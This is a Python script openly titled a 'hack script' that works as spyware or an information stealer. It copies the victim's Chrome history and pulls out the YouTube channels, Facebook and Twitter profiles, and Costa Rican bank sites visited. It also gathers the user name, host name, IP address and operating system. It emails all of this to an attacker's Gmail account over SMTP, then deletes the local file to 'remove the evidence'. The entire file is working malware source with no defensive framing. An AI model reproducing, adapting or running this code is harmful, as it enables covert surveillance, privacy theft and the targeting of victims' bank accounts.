# Sh4dow18 Information Hack Script (SIHS)
# Version: 1.0
# Made by: Sh4dow18
# Github: https://github.com/sh4dow18
# Requirements: https://www.google.com/settings/security/lesssecureapps -> Put YES

from platform import system
from platform import platform
from getpass import getuser
import socket
import sqlite3
from shutil import copyfile
from re import findall as regex
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from os import remove


def ObtainIpAddress():
    using_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    using_socket.connect(("8.8.8.8", 80))
    ip_address = using_socket.getsockname()[0]
    using_socket.close()
    return ip_address


def ObtainUserPath(what_system, user):
    user_path = None
    if what_system == "Windows":
        user_path = "C:\\Users\\" + user
    elif  what_system == "Linux":
        user_path = "/home/" + user
    return user_path


def ObtainChromeHistory(what_system, user_path):
    chrome_history = None
    chrome_history_path = None
    if what_system == "Windows":
        chrome_history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
    elif what_system == "Linux":
        chrome_history_path = user_path + "/.config/google-chrome/Default/History"
    while chrome_history is None:
        try:
            temp_history = chrome_history_path + "_temp"
            copyfile(chrome_history_path, temp_history)
            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            chrome_history = cursor.fetchall()
        except sqlite3.OperationalError:
            print("Error, retrying...")
    return chrome_history


def ObtainYoutubeChannels(chrome_history):
    channels_visited = []
    for youtube in chrome_history:
        results = regex("https://www.youtube.com/c/([A-Za-z0-9]+)", youtube[2])
        if len(results) != 0:
            if results[0] not in channels_visited:
                channels_visited.append(results[0])
    return channels_visited


def ObtainFacebookProfiles(chrome_history):
    facebook_profiles = []
    for facebook in chrome_history:
        results = regex("https://www.facebook.com/([A-Za-z0-9._]+)", facebook[2])
        if len(results) != 0:
            if results[0] not in facebook_profiles and results[0] != "pg":
                facebook_profiles.append(results[0])
    return facebook_profiles


def ObtainTwitterProfiles(chrome_history):
    twitter_profiles = []
    for twitter in chrome_history:
        results = regex("https://twitter.com/([A-Za-z0-9_]+)", twitter[2])
        if len(results) != 0:
            if results[0] not in twitter_profiles:
                twitter_profiles.append(results[0])
    return twitter_profiles


def ObtainBanks(chrome_history):
    banks_found = []
    banks = ["Grupo Mutual Sitio Web", "Banco Promerica - Costa Rica | Banco Promerica Costa Rica", "Banco BCR", "Banco Nacional"]
    for bank_found in chrome_history:
        for bank in banks:
            if bank_found[0].lower() == bank.lower():
                if bank_found[0] not in banks_found:
                    banks_found.append(bank_found[0])
    return banks_found


def InformationFile(user, host, ip_address, what_platform, channels_visited, facebook_profiles, twitter_profiles, banks_found):
    file = open("information.txt", "w")
    file.write("- User: " + user)
    file.write("\n- Host: " + host)
    file.write("\n- Ip Address: " + ip_address)
    file.write("\n- Operating System: " + what_platform)
    file.write("\n- Youtube Channels Visited: ")
    AddingInformation(file, channels_visited)
    file.write("\n- Facebook Profiles Visited: ")
    AddingInformation(file, facebook_profiles)
    file.write("\n- Twitter Profiles Visited: ")
    AddingInformation(file, twitter_profiles)
    file.write("\n- Banks Found: ")
    AddingInformation(file, banks_found)
    file.close()


def AddingInformation(file, information):
    if len(information) != 0:
        file.write("{}".format(", ".join(information)))
    else:
        file.write("None Found")


def SendEmail(user, host):
    destinatary_email = "<your_gmail>"
    message = MIMEMultipart()
    message['to'] = destinatary_email
    message['from'] = destinatary_email
    message['subject'] = "Success"
    readding_file = open("information.txt", "r")
    attached_file = MIMEApplication(readding_file.read(),'utf-8')
    attached_file.add_header('Content-Disposition', 'attachment', filename="{}@{}.txt".format(user, host))
    message.attach(attached_file)
    readding_file.close()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(destinatary_email,"<your_password>")
    server.sendmail(message['from'], message['to'], message.as_string())
    server.quit()


def main():
    # Obtaining Operating System
    what_system = system()
    what_platform = platform()
    # Obtaining User Name
    user = getuser()
    # Obtaining Computer Name
    host = socket.gethostname()
    # Obtaining Private Ip Address
    ip_address = ObtainIpAddress()
    # Creating User Path
    user_path = ObtainUserPath(what_system, user)
    # Catch Chrome History
    chrome_history = ObtainChromeHistory(what_system, user_path)
    # Obtaining Chrome History Information
    channels_visited = ObtainYoutubeChannels(chrome_history)
    facebook_profiles = ObtainFacebookProfiles(chrome_history)
    twitter_profiles = ObtainTwitterProfiles(chrome_history)
    banks_found = ObtainBanks(chrome_history)
    # Creating File with all the information obtained
    InformationFile(user, host, ip_address, what_platform, channels_visited, facebook_profiles, twitter_profiles,  banks_found)
    # Sending Email with the file to GMAIL
    SendEmail(user, host)
    # Remove the Evidence
    remove("information.txt")


if __name__ == "__main__":
    main()

